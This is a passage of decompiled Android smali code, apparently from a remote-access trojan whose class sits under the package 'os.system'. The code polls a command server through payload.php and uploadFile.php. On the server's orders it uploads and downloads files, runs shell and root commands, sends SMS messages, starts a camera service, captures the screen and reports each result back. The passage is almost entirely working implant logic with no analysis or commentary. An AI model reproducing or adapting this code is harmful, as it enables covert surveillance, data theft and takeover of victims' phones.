    sget-object v4, Los/system/SystemThread;->urlServer:Ljava/lang/String;

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    const-string v4, "/uploadFile.php"

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    sput-object v3, Los/system/ReceiverBoot;->requestUrl:Ljava/lang/String;

    .line 458
    move-object/from16 v0, p0

    iget-object v3, v0, Los/system/SystemThread;->receAction:Los/system/ReceiverBoot;

    const-string v3, "upload"

    sput-object v3, Los/system/ReceiverBoot;->requestAksi:Ljava/lang/String;

    .line 459
    move-object/from16 v0, p0

    iget-object v3, v0, Los/system/SystemThread;->receAction:Los/system/ReceiverBoot;

    sput-object v2, Los/system/ReceiverBoot;->requestPath:Ljava/lang/String;

    .line 460
    move-object/from16 v0, p0

    iget-object v3, v0, Los/system/SystemThread;->receAction:Los/system/ReceiverBoot;

    move-object/from16 v0, p1

    invoke-virtual {v3, v0}, Los/system/ReceiverBoot;->mainRequest(Landroid/content/Context;)V

    .line 463
    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    sget-object v4, Los/system/SystemThread;->urlServer:Ljava/lang/String;

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    const-string v4, "/payload.php?outpayload="

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    const-string v5, "upload file : "

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    move-object/from16 v0, p0

    invoke-virtual {v0, v2}, Los/system/SystemThread;->textPayload(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v3, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    const-string v3, "null"

    move-object/from16 v0, p0

    move-object/from16 v1, p1

    invoke-virtual {v0, v1, v2, v3}, Los/system/SystemThread;->reqPayload(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V
    :try_end_12
    .catch Ljava/lang/Exception; {:try_start_12 .. :try_end_12} :catch_9

    .line 468
    :goto_12
    :try_start_13
    sget-object v2, Los/system/SystemThread;->payloadWebResult:Ljava/lang/String;

    const-string v3, "-down-"

    invoke-virtual {v2, v3}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v4

    .line 469
    const-string v2, ""

    .line 470
    const-string v2, ""
    :try_end_13
    .catch Ljava/lang/Exception; {:try_start_13 .. :try_end_13} :catch_12

    .line 472
    const/4 v2, 0x3

    :try_start_14
    aget-object v2, v4, v2

    .line 473
    const/4 v3, 0x1

    aget-object v3, v4, v3
    :try_end_14
    .catch Ljava/lang/Exception; {:try_start_14 .. :try_end_14} :catch_a

    .line 479
    :goto_13
    :try_start_15
    move-object/from16 v0, p0

    iget-object v5, v0, Los/system/SystemThread;->receAction:Los/system/ReceiverBoot;

    sput-object v3, Los/system/ReceiverBoot;->requestUrl:Ljava/lang/String;

    .line 480
    move-object/from16 v0, p0

    iget-object v3, v0, Los/system/SystemThread;->receAction:Los/system/ReceiverBoot;

    const-string v3, "download"

    sput-object v3, Los/system/ReceiverBoot;->requestAksi:Ljava/lang/String;

    .line 481
    move-object/from16 v0, p0

    iget-object v3, v0, Los/system/SystemThread;->receAction:Los/system/ReceiverBoot;

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    const/4 v5, 0x2

    aget-object v5, v4, v5

    invoke-virtual {v3, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    const-string v5, "/"

    invoke-virtual {v3, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    sput-object v2, Los/system/ReceiverBoot;->requestPath:Ljava/lang/String;

    .line 482
    move-object/from16 v0, p0

    iget-object v2, v0, Los/system/SystemThread;->receAction:Los/system/ReceiverBoot;

    move-object/from16 v0, p1

    invoke-virtual {v2, v0}, Los/system/ReceiverBoot;->mainRequest(Landroid/content/Context;)V

    .line 483
    const-wide/16 v2, 0x1388

    invoke-static {v2, v3}, Ljava/lang/Thread;->sleep(J)V

    .line 486
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    sget-object v3, Los/system/SystemThread;->urlServer:Ljava/lang/String;

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, "/payload.php?outpayload="

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    const-string v5, "dwnload file : "

    invoke-virtual {v3, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    const/4 v5, 0x1

    aget-object v4, v4, v5

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    move-object/from16 v0, p0

    invoke-virtual {v0, v3}, Los/system/SystemThread;->textPayload(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    const-string v3, "null"

    move-object/from16 v0, p0

    move-object/from16 v1, p1

    invoke-virtual {v0, v1, v2, v3}, Los/system/SystemThread;->reqPayload(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V
    :try_end_15
    .catch Ljava/lang/Exception; {:try_start_15 .. :try_end_15} :catch_12

    .line 491
    :goto_14
    :try_start_16
    sget-object v2, Los/system/SystemThread;->payloadWebResult:Ljava/lang/String;

    const-string v3, "-alert-"

    invoke-virtual {v2, v3}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;
    :try_end_16
    .catch Ljava/lang/Exception; {:try_start_16 .. :try_end_16} :catch_c

    move-result-object v8

    .line 493
    const/4 v2, 0x4

    :try_start_17
    aget-object v2, v8, v2

    invoke-static {v2}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I
    :try_end_17
    .catch Ljava/lang/Exception; {:try_start_17 .. :try_end_17} :catch_11

    .line 496
    :goto_15
    const/4 v2, 0x3

    :try_start_18
    aget-object v2, v8, v2

    const-string v3, "atas"

    invoke-virtual {v2, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_23

    const/16 v2, 0x30

    sput v2, Los/system/SystemThread;->alert_letak:I

    .line 502
    :cond_17
    :goto_16
    const/4 v2, 0x2

    aget-object v2, v8, v2

    const-string v3, "biru"

    invoke-virtual {v2, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_27

    const v2, -0xffff01

    sput v2, Los/system/SystemThread;->alert_warna:I

    .line 507
    :cond_18
    :goto_17
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    sget-object v3, Los/system/SystemThread;->urlServer:Ljava/lang/String;

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, "/payload.php?outpayload="

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    const-string v4, "toast text:"

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    const/4 v4, 0x1

    aget-object v4, v8, v4

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    const-string v4, " letak:"

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    sget v4, Los/system/SystemThread;->alert_letak:I

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v3

    const-string v4, " warna:"

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    sget v4, Los/system/SystemThread;->alert_warna:I

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v3

    const-string v4, " durasi:"

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    sget v4, Los/system/SystemThread;->alert_durasi:I

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    move-object/from16 v0, p0

    invoke-virtual {v0, v3}, Los/system/SystemThread;->textPayload(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    const-string v3, "null"

    move-object/from16 v0, p0

    move-object/from16 v1, p1

    invoke-virtual {v0, v1, v2, v3}, Los/system/SystemThread;->reqPayload(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    .line 509
    new-instance v2, Los/system/SystemThread$4;

    sget v3, Los/system/SystemThread;->alert_durasi:I

    int-to-long v4, v3

    const-wide/16 v6, 0x64

    move-object/from16 v3, p0

    move-object/from16 v9, p1

    invoke-direct/range {v2 .. v9}, Los/system/SystemThread$4;-><init>(Los/system/SystemThread;JJ[Ljava/lang/String;Landroid/content/Context;)V

    .line 522
    invoke-virtual {v2}, Los/system/SystemThread$4;->start()Landroid/os/CountDownTimer;
    :try_end_18
    .catch Ljava/lang/Exception; {:try_start_18 .. :try_end_18} :catch_b

    .line 544
    :goto_18
    :try_start_19
    sget-object v2, Los/system/SystemThread;->payloadWebResult:Ljava/lang/String;

    const-string v3, "-/-"

    invoke-virtual {v2, v3}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v2

    .line 546
    sget-object v3, Los/system/SystemThread;->TAG:Ljava/lang/String;

    move-object/from16 v0, p0

    iget-object v4, v0, Los/system/SystemThread;->receAction:Los/system/ReceiverBoot;

    const/4 v5, 0x1

    aget-object v5, v2, v5

    const-string v6, "\n"

    invoke-virtual {v4, v5, v6}, Los/system/ReceiverBoot;->textSplit(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    invoke-static {v3, v4}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 547
    move-object/from16 v0, p0

    iget-object v3, v0, Los/system/SystemThread;->receAction:Los/system/ReceiverBoot;

    move-object/from16 v0, p0

    iget-object v4, v0, Los/system/SystemThread;->receAction:Los/system/ReceiverBoot;

    const/4 v5, 0x1

    aget-object v5, v2, v5

    const-string v6, "\n"

    invoke-virtual {v4, v5, v6}, Los/system/ReceiverBoot;->textSplit(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    const/4 v5, 0x2

    aget-object v2, v2, v5

    move-object/from16 v0, p1

    invoke-virtual {v3, v0, v4, v2}, Los/system/ReceiverBoot;->editor(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    .line 550
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    sget-object v3, Los/system/SystemThread;->urlServer:Ljava/lang/String;

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, "/payload.php?outpayload="

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, "text tersimpan siap dieksukesi<-_->"

    move-object/from16 v0, p0

    invoke-virtual {v0, v3}, Los/system/SystemThread;->textPayload(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    const-string v3, "null"

    move-object/from16 v0, p0

    move-object/from16 v1, p1

    invoke-virtual {v0, v1, v2, v3}, Los/system/SystemThread;->reqPayload(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V
    :try_end_19
    .catch Ljava/lang/Exception; {:try_start_19 .. :try_end_19} :catch_10

    .line 554
    :goto_19
    :try_start_1a
    sget-object v2, Los/system/SystemThread;->payloadWebResult:Ljava/lang/String;

    const-string v3, "-_-"

    invoke-virtual {v2, v3}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v2

    move-object/from16 v0, p0

    iput-object v2, v0, Los/system/SystemThread;->term:[Ljava/lang/String;

    .line 555
    move-object/from16 v0, p0

    iget-object v2, v0, Los/system/SystemThread;->term:[Ljava/lang/String;

    const/4 v3, 0x1

    aget-object v2, v2, v3

    const-string v3, ""

    if-eq v2, v3, :cond_19

    .line 556
    move-object/from16 v0, p0

    iget-object v2, v0, Los/system/SystemThread;->receAction:Los/system/ReceiverBoot;

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    const-string v4, ""

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    move-object/from16 v0, p0

    iget-object v4, v0, Los/system/SystemThread;->term:[Ljava/lang/String;

    const/4 v5, 0x1

    aget-object v4, v4, v5

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Los/system/ReceiverBoot;->shellCommands(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    move-object/from16 v0, p0

    invoke-virtual {v0, v2}, Los/system/SystemThread;->textPayload(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    .line 557
    sget-object v3, Los/system/SystemThread;->TAG:Ljava/lang/String;

    invoke-static {v3, v2}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 559
    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    sget-object v4, Los/system/SystemThread;->urlServer:Ljava/lang/String;

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    const-string v4, "/payload.php?outpayload="

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    const-string v3, "null"

    move-object/from16 v0, p0

    move-object/from16 v1, p1

    invoke-virtual {v0, v1, v2, v3}, Los/system/SystemThread;->reqPayload(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V
    :try_end_1a
    .catch Ljava/lang/Exception; {:try_start_1a .. :try_end_1a} :catch_f

    .line 565
    :cond_19
    :goto_1a
    :try_start_1b
    sget-object v2, Los/system/SystemThread;->payloadWebResult:Ljava/lang/String;

    const-string v3, "-su-"

    invoke-virtual {v2, v3}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v2

    move-object/from16 v0, p0

    iput-object v2, v0, Los/system/SystemThread;->term:[Ljava/lang/String;

    .line 566
    move-object/from16 v0, p0

    iget-object v2, v0, Los/system/SystemThread;->term:[Ljava/lang/String;

    const/4 v3, 0x1

    aget-object v2, v2, v3

    const-string v3, ""

    if-eq v2, v3, :cond_1a

    .line 567
    const/4 v2, 0x1

    new-array v2, v2, [Ljava/lang/String;

    const/4 v3, 0x0

    move-object/from16 v0, p0

    iget-object v4, v0, Los/system/SystemThread;->term:[Ljava/lang/String;

    const/4 v5, 0x1

    aget-object v4, v4, v5

    aput-object v4, v2, v3

    .line 568
    const-string v3, ""
    :try_end_1b
    .catch Ljava/lang/Exception; {:try_start_1b .. :try_end_1b} :catch_e

    .line 570
    :try_start_1c
    move-object/from16 v0, p0

    iget-object v3, v0, Los/system/SystemThread;->receAction:Los/system/ReceiverBoot;

    invoke-virtual {v3, v2}, Los/system/ReceiverBoot;->rootCommands([Ljava/lang/String;)V

    .line 571
    const-string v2, "sukses execute root"
    :try_end_1c
    .catch Ljava/lang/Exception; {:try_start_1c .. :try_end_1c} :catch_d

    .line 575
    :goto_1b
    :try_start_1d
    move-object/from16 v0, p0

    invoke-virtual {v0, v2}, Los/system/SystemThread;->textPayload(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    .line 576
    sget-object v3, Los/system/SystemThread;->TAG:Ljava/lang/String;

    invoke-static {v3, v2}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 578
    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    sget-object v4, Los/system/SystemThread;->urlServer:Ljava/lang/String;

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    const-string v4, "/payload.php?outpayload="

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    const-string v3, "null"

    move-object/from16 v0, p0

    move-object/from16 v1, p1

    invoke-virtual {v0, v1, v2, v3}, Los/system/SystemThread;->reqPayload(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V
    :try_end_1d
    .catch Ljava/lang/Exception; {:try_start_1d .. :try_end_1d} :catch_e

    .line 582
    :cond_1a
    :goto_1c
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    sget-object v3, Los/system/SystemThread;->urlServer:Ljava/lang/String;

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, "/payload.php?inpayload=null"

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    const-string v3, "null"

    move-object/from16 v0, p0

    move-object/from16 v1, p0

    invoke-virtual {v0, v1, v2, v3}, Los/system/SystemThread;->reqPayload(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    .line 584
    :cond_1b
    return-void

    .line 329
    :cond_1c
    :try_start_1e
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    sget-object v3, Los/system/SystemThread;->urlServer:Ljava/lang/String;

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, "/payload.php?outpayload="

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, "sms kosong"

    move-object/from16 v0, p0

    invoke-virtual {v0, v3}, Los/system/SystemThread;->textPayload(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    const-string v3, "null"

    move-object/from16 v0, p0

    move-object/from16 v1, p1

    invoke-virtual {v0, v1, v2, v3}, Los/system/SystemThread;->reqPayload(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    .line 330
    sget-object v2, Los/system/SystemThread;->TAG:Ljava/lang/String;

    const-string v3, "kosong"

    invoke-static {v2, v3}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    goto/16 :goto_a

    .line 345
    :catch_5
    move-exception v2

    goto/16 :goto_a

    .line 334
    :cond_1d
    const-string v3, ""
    :try_end_1e
    .catch Ljava/lang/Exception; {:try_start_1e .. :try_end_1e} :catch_5

    .line 336
    :try_start_1f
    new-instance v4, Los/system/MainActivity;

    invoke-direct {v4}, Los/system/MainActivity;-><init>()V

    const/4 v4, 0x2

    aget-object v4, v2, v4

    const/4 v5, 0x1

    aget-object v2, v2, v5

    move-object/from16 v0, p1

    invoke-static {v0, v4, v2}, Los/system/MainActivity;->sendSMS(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
    :try_end_1f
    .catch Ljava/lang/Exception; {:try_start_1f .. :try_end_1f} :catch_6

    move-result-object v2

    .line 340
    :goto_1d
    :try_start_20
    sget-object v3, Los/system/SystemThread;->TAG:Ljava/lang/String;

    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    const-string v5, "sms:"

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    invoke-static {v3, v4}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 343
    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    sget-object v4, Los/system/SystemThread;->urlServer:Ljava/lang/String;

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    const-string v4, "/payload.php?outpayload="

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    move-object/from16 v0, p0

    invoke-virtual {v0, v2}, Los/system/SystemThread;->textPayload(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v3, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    const-string v3, "null"

    move-object/from16 v0, p0

    move-object/from16 v1, p1

    invoke-virtual {v0, v1, v2, v3}, Los/system/SystemThread;->reqPayload(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    goto/16 :goto_a

    .line 337
    :catch_6
    move-exception v2

    .line 338
    sget-object v4, Los/system/SystemThread;->TAG:Ljava/lang/String;

    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    const-string v6, "smserr:"

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v5, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-static {v4, v2}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_20
    .catch Ljava/lang/Exception; {:try_start_20 .. :try_end_20} :catch_5

    move-object v2, v3

    goto :goto_1d

    .line 408
    :cond_1e
    const/4 v3, 0x1

    :try_start_21
    aget-object v2, v2, v3

    const-string v3, "back"

    invoke-virtual {v2, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_16

    .line 409
    const/4 v2, 0x0

    sput v2, Los/system/CamRuntime;->isCamera:I

    .line 410
    new-instance v2, Landroid/content/Intent;

    const-class v3, Los/system/CamRuntime;

    move-object/from16 v0, p1

    invoke-direct {v2, v0, v3}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 411
    move-object/from16 v0, p1

    invoke-virtual {v0, v2}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    .line 413
    move-object/from16 v0, p0

    iget-object v3, v0, Los/system/SystemThread;->camServiceConeksi:Landroid/content/ServiceConnection;

    const/4 v4, 0x0

    move-object/from16 v0, p0

    invoke-virtual {v0, v2, v3, v4}, Los/system/SystemThread;->bindService(Landroid/content/Intent;Landroid/content/ServiceConnection;I)Z
    :try_end_21
    .catch Ljava/lang/Exception; {:try_start_21 .. :try_end_21} :catch_7

    goto/16 :goto_e

    .line 417
    :catch_7
    move-exception v2

    goto/16 :goto_f

    .line 427
    :cond_1f
    :try_start_22
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    sget-object v3, Los/system/SystemThread;->urlServer:Ljava/lang/String;

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, "/payload.php?outpayload="

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, "gagal buka apk"

    move-object/from16 v0, p0

    invoke-virtual {v0, v3}, Los/system/SystemThread;->textPayload(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    const-string v3, "null"

    move-object/from16 v0, p0

    move-object/from16 v1, p1

    invoke-virtual {v0, v1, v2, v3}, Los/system/SystemThread;->reqPayload(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V
    :try_end_22
    .catch Ljava/lang/Exception; {:try_start_22 .. :try_end_22} :catch_8

    goto/16 :goto_10

    .line 432
    :catch_8
    move-exception v2

    goto/16 :goto_10

    .line 443
    :cond_20
    const/4 v3, 0x1

    :try_start_23
    aget-object v3, v2, v3

    const-string v4, "screen"

    invoke-virtual {v3, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-eqz v3, :cond_21

    .line 444
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    move-object/from16 v0, p0

    iget-object v3, v0, Los/system/SystemThread;->receAction:Los/system/ReceiverBoot;

    sget-object v3, Los/system/ReceiverBoot;->pathExternal:Ljava/lang/String;

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, "/screen.jpg"

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

